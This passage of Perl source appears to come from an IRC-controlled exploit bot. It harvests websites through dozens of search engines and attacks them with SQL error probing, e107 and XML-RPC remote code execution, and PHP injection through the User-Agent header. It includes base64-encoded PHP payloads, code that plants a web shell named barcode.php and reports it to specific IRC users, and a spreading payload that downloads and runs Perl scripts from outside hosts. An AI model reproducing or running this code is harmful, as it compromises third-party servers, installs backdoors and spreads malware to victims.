	    my $sqlsite = "http://".$site.$bug;
            my $html = &get_content($sqlxpl);
            if ($html =~ m/You have an error in your SQL syntax/i ) {
                       &msg("$chan","$sqllogo8,1(8,1@3$engine8)(MySQL)8,18 $sqlvuln 8,19(Mode-Test-PHP)8,9");
            }elsif 
               ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
                        &msg("$chan","$sqllogo8,1(8,1@3$engine8)(MsSQL)8,18 $sqlvuln 8,19(Mode-Test-ASP)8,9");
            }elsif 
               ( $html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i ) {
                       &msg("$chan","$sqllogo8,1(8,1@3$engine8)(MsAccess)8,18 $sqlvuln 8,19(Mode-Test-ASP)8,9");
            }
        }
    }
}

sub e107() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$e107logo8,1(8,1@3$engine8)8,18 Scan finish for $dork"); }
            my $e107xpl = "http://".$site.$bug;
            my $code = "ZWNobyAiQXV6c25ldDxicj4iOwplY2hvICJzeXM6Ii5waHBfdW5hbWUoKS4iPGJyPiI7CiRjbWQ9ImVjaG8gbjBuMHgiOwokZXNlZ3VpY21kPWV4KCRjbWQpOwplY2hvICRlc2VndWljbWQ7CmZ1bmN0aW9uIGV4KCRjZmUpewokcmVzID0gJyc7CmlmICghZW1wdHkoJGNmZSkpewppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSl7CkBleGVjKCRjZmUsJHJlcyk7CiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7Cn0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKXsKJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXsKQG9iX3N0YXJ0KCk7CkBzeXN0ZW0oJGNmZSk7CiRyZXMgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7CkBvYl9lbmRfY2xlYW4oKTsKfQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsKQG9iX3N0YXJ0KCk7CkBwYXNzdGhydSgkY2ZlKTsKJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKQG9iX2VuZF9jbGVhbigpOwp9CmVsc2VpZihAaXNfcmVzb3VyY2UoJGYgPSBAcG9wZW4oJGNmZSwiciIpKSl7CiRyZXMgPSAiIjsKd2hpbGUoIUBmZW9mKCRmKSkgeyAkcmVzIC49IEBmcmVhZCgkZiwxMDI0KTsgfQpAcGNsb3NlKCRmKTsKfX0KcmV0dXJuICRyZXM7Cn0=";
            my $html = e107_rce_query($e107xpl,$code);
            if ($html =~ /Auzsnet<br>sys:(.+?)<br>n0n0x/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","barcode.php")) { echo "AuzsnetSUKSESAuzsnet"; }';
                    my $res = e107_rce_query($e107xpl,encode_base64($upload));
                    if ($res =~ /AuzsnetSUKSESAuzsnet/) {
                        &msg("$chan","$e107logo8,1(8,1@3$engine8)(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,19(safemode-off)8,9");
			&msg("picko","8,1(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,19(safemode-off)8,9");
			&msg("x0r","8,1(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,19(safemode-off)8,9");
                        sleep(2);
                    }
                    else {
                        &msg("$chan","$e107logo8,1(8,1@3$engine8)(8,1e107-Vuln8)8,1 ".$e107xpl." 8,1".$sys." 8,19(safemode-off)8,9");
                        sleep(2);
                    }
                    &e107_spread_query($e107xpl);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /Auzsnet<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","barcode.php")) { echo "AuzsnetSUKSESAuzsnet"; }';
                    my $res = e107_rce_query($e107xpl,encode_base64($upload));
                    if ($res =~ /AuzsnetSUKSESAuzsnet/) {
                        &msg("$chan","$e107logo8,1(8,1@3$engine8)(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,14(safemode-on)8,4");
                        &msg("picko","8,1(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,14(safemode-on)8,4");
                        &msg("x0r","8,1(8,1e107-SheLL8)4 http://".$site."8,1barcode.php 8,1".$sys." 8,14(safemode-on)8,4");
                        sleep(2);
                    }
                    else {
                        &msg("$chan","$e107logo8,1(8,1@3$engine8)(8,1e107-Vuln8)8,1 ".$e107xpl." 8,1".$sys." 8,14(safemode-on)8,4");
                        sleep(2);
                    }
                } exit; } sleep(2);
            }
        }
    }
}

########################################

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }
    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }
    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }
    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }
    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }
    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }
    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }
    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }
    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }
    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }
    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }
    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }
    if ($engine eq "oNeT") { my @onet = &onet($dork); push(@total,@onet); }
    if ($engine eq "SiZuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }
    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
    if ($engine eq "DeMos") { my @demos = &demos($dork); push(@total,@demos); }
    if ($engine eq "RoSe") { my @rose = &rose($dork); push(@total,@rose); }
    if ($engine eq "SeZnaM") { my @seznam = &seznam($dork); push(@total,@seznam); }
    if ($engine eq "TisCali") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }
    if ($engine eq "NaVeR") { my @naver = &naver($dork); push(@total,@naver); }
    if ($engine eq "live") { my @live = &live($dork); push(@total,@live); }
    if ($engine eq "biglobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
    if ($engine eq "nova") { my @nova = &nova($dork); push(@total,@nova); }
    if ($engine eq "nadji") { my @nadji = &nadji($dork); push(@total,@nadji); }
    if ($engine eq "goo") { my @goo = &goo($dork); push(@total,@goo); }
    if ($engine eq "uksubmit") { my @uksubmit = &uksubmit($dork); push(@total,@uksubmit); }
    if ($engine eq "excite") { my @excite = &excite($dork); push(@total,@excite); }
    if ($engine eq "amidalla") { my @amidalla = &amidalla($dork); push(@total,@amidalla); }
    if ($engine eq "buscar") { my @buscar = &buscar($dork); push(@total,@buscar); }
    if ($engine eq "sogou") { my @sogou = &sogou($dork); push(@total,@sogou); }
    if ($engine eq "interia") { my @interia = &interia($dork); push(@total,@interia); }
    if ($engine eq "snz") { my @snz = &snz($dork); push(@total,@snz); }
    if ($engine eq "yandex") { my @yandex = &yandex($dork); push(@total,@yandex); }
    if ($engine eq "joeant") { my @joeant = &joeant($dork); push(@total,@joeant); }
    if ($engine eq "terra") { my @terra = &terra($dork); push(@total,@terra); }
    if ($engine eq "youdao") { my @youdao = &youdao($dork); push(@total,@youdao); }
    if ($engine eq "amfibi") { my @amfibi = &amfibi($dork); push(@total,@amfibi); }
    if ($engine eq "bigclique") { my @bigclique = &bigclique($dork); push(@total,@bigclique); }
    if ($engine eq "dancefloor") { my @dancefloor = &dancefloor($dork); push(@total,@dancefloor); }
    if ($engine eq "rakuten") { my @rakuten = &rakuten($dork); push(@total,@rakuten); }
    @clean = clean(@total);
    &msg("$chan","$logo8,1(8,1@3$engine8) 4Total:4,14 (".scalar(@total).")8,13 Clean:4,13 (".scalar(@clean).")3,13");
    return @clean;
}

#########################################

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "Auzsnet<?system(\"$cmd 2> /dev/stdout\"); ?>n0n0x";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /Auzsnet(.*)n0n0x/s) {
print $1;
&msg("$chan","(LFICMD)2 $1");
} else {
&msg("$chan","(LFICMD)4 No Output");
}
}

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'Auzsnet';echo`".$dwa."`;echo'n0n0x';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /Auzsnet(.*)n0n0x/s) {
print $1;
&msg("$chan","(XMLCMD)2 $1");
} else {
&msg("$chan","(XMLCMD)4 No Output");
}
}

sub cmde107() {
my $url  = $_[0];
my $code = $_[1];
my $chan  = $_[2];
my $codecmd = encode_base64($code);
my $cmd = 'echo(base64_decode("QXV6c25ldA==").shell_exec(base64_decode("aWQ=")).base64_decode("bjBuMHg=")).shell_exec(base64_decode("'.$codecmd.'"));';
    my $req = HTTP::Request->new(POST => $path);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]".$cmd.";die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
my $data = $res->as_string;
if ( $data =~ /Auzsnet(.*)n0n0x/ ){
     $mydata = $1;
&msg("$chan","(e107CMD)2 $mydata");
}
else { &msg("$chan","(e107CMD)4 No Output"); 
}
}

#########################################

sub os() {
    my $url = $_[0];
    my $chk  = get_content($url);
    if ( $chk =~ m/<br>uname -a:(.+?)\<br>/g ) {
        $un = $1;
    }
    if ( $chk =~ m/<br>os:(.+?)\<br>/g ) {
        $os = $1;
    }
}

sub rce_os() {
    my $sys = "";
    my $url = $_[0];
    my $chk = get_content($url);
    $chk =~ s/\n//;
    if ($chk =~ /999(.*)666/sg) { $sys = $1; }
    return $sys;
}

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_env_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
    $ua->timeout(10);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_spread_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $agent = "<?php echo \"Auzsnetb0t#\"; passthru(\'".$code."\'); echo \"#Auzsnetb0t\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'Auzsnet';echo`uname -a`;echo'n0n0x';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /Auzsnet(.*)n0n0x/s) {
$os=$1;
}}
sub xmlvuln {
my $xmltargt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'Auzsnet'.'T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /Auzsnet/) {
$shellx=$xmltargt;
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'Auzsnet';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3O2NkIC90bXA7cm0gLXJmIGRvci4qICoudHh0Lio7ZmV0Y2ggaHR0cDovL3RlbWFuZ3VlLmNvbS90b29scy9hbGF0LnR4dDt3Z2V0IGh0dHA6Ly90ZW1hbmd1ZS5jb20vdG9vbHMvYWxhdC50eHQ7Y3VybCAtTyBodHRwOi8vdGVtYW5ndWUuY29tL3Rvb2xzL2FsYXQudHh0O2x3cC1kb3dubG9hZCBodHRwOi8vdGVtYW5ndWUuY29tL3Rvb2xzL2FsYXQudHh0O3BlcmwgYWxhdC50eHQ7cm0gLXJmIGFsYXQqO2N1cmwgLU8gaHR0cDovL3dvbWFuY2FtcC5jby5rci9vcy50eHQ7cGVybCBvcy50eHQ7cm0gLXJmIG9zLnR4dDtodHRwOi8vd29tYW5jYW1wLmNvLmtyL29zLnR4dDtwZXJsIG9zLnR4dDtybSAtcmYgb3MqOyI7DQokZXNlZ3VpY21kPWV4KCRjbWQpO2VjaG8gJGVzZWd1aWNtZDsNCmZ1bmN0aW9uIGV4KCRjZmUpew0KJHJlcyA9ICcnOw0KaWYgKCFlbXB0eSgkY2ZlKSl7DQppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSl7DQpAZXhlYygkY2ZlLCRyZXMpOw0KJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSl7DQokcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSl7DQpAb2Jfc3RhcnQoKTsNCkBzeXN0ZW0oJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSl7DQpAb2Jfc3RhcnQoKTsNCkBwYXNzdGhydSgkY2ZlKTsNCiRyZXMgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7DQpAb2JfZW5kX2NsZWFuKCk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwb3BlbicpKXsNCiRmID0gQHBvcGVuKCRjZmUsInIiKTsNCndoaWxlKCFAZmVvZigkY2ZlKSkgeyAkcmVzIC49IEBmcmVhZCgkY2ZlLDEwMjQpOyB9DQpAcGNsb3NlKCRmKTsNCn19DQpyZXR1cm4gJHJlczsNCn0=";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
}

######################################### SEARCH ENGINE

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=5000; $i+=10){
        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rediff() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=3000; $i+=10) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
            my $link = $1;
            if ($link !~ /search1|rediff/){
				my @grep = &links($link);
				push(@list,@grep);
			}
        }
    }
    return @list;
}

sub uol() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10) {
        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            my $link = $1;
            if ($link !~ /busca|uol|yahoo/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bing/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub altavista() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10){
        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=ngrn>(.+?)\//g) {
            my $link = $1;
            if ($link !~ /altavista/){
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=3000; $i+=10) {
        my $search = ("http://it.ask.com/web?q=".&key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /ask\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".&key($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            if ($1 !~ /yahoo\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=3000; $b+=10) {
        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
        my $res = &search_engine_query($search);
        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {
            my $link = $1;
            if ($link!~ /yippy|clusty/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gutser() {
    my @list;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");
        my $res = &search_engine_query($search);
        while ($res =~ m/\">(.*?)<\/a><\/div><\/li><li>/g) {
            my $link = $1;
            if ($link!~ /goodsearch/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google2() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = (
    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu","co.id","com.my");
foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
    for ($b=1; $b<=3000; $b+=10) {
        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link!~ /google|search/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
}
sub exalead() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=4000; $b+=100) {
        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /exalead/){
                my @grep = &links($link);
                push(@list,@grep);
            }
            }
        }
    return @list;	
}	

sub lycos() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web&diktfc=468007302EF7DB9AFE53D4138B848E7B4000D424385F");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmouseover=/g) {
            if ($1 !~ /lycos\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub virgilio() {
  my @list;
  my $key = $_[0];
    for ($b=10; $b<=3000; $b+=10) {
        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /virgilio/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub webde() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=300; $b+=1) {
        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".$key);
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {
            my $link = $1;
            if ($link!~ /suche|web/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub aol() {
  my @list;
  my $key = $_[0];
    for ($b=2; $b<=300; $b+=1) {
        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {
            my $link = $1;
            if ($link!~ /aol\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub sapo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /sapo/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub duck() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /duck/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lygo() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"><img/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yause() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.*?)\" onfocus=/g) {
            my $link = $1;
            if ($link!~ /yauba|websites/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub baidu() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=3000; $b+=10) {
        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {
            my $link = $1;
            if ($link!~ /baidu/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kipot() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=300; $b+=1) {
        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {
            my $link = $1;
            if ($link!~ /qkport/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gibla() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=3000; $b+=10) {
        my $search = ("http://www.gigablast.com/search?s=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=http:\/\/(.*?)><font size=/g) {
            my $link = $1;
            if ($link!~ /gigablast/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub black() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);
		my $cek = $b+1;
        my $res = &search_engine_query($search);
		if ($res !~ m/<strong>$b<\/strong>/i) {$b=50;}
        while ($res =~ m/class=\"UrlTitleLine\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /blekko/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
